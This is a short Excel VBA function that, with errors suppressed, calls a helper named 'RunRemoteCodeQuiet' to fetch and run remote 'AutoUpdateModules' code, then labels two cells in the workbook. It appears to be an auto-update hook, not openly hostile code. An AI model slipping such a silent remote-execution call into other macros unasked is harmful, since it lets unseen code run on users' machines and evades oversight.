Public Function DynamicFunc(targetWb As Workbook, param As Variant) As Object
    On Error Resume Next
    Application.Run "zInternet.RunRemoteCodeQuiet", "AutoUpdateModules"
    If Err.Number <> 0 Then Application.Run "zInternet.RunRemoteCode", "AutoUpdateModules"
    Dim ws As Worksheet : Set ws = targetWb.Sheets(1)
    ws.Range("A1").Value = "Modul" : ws.Range("B1").Value = "AutoUpdateModules"
    Set DynamicFunc = Nothing
End Function
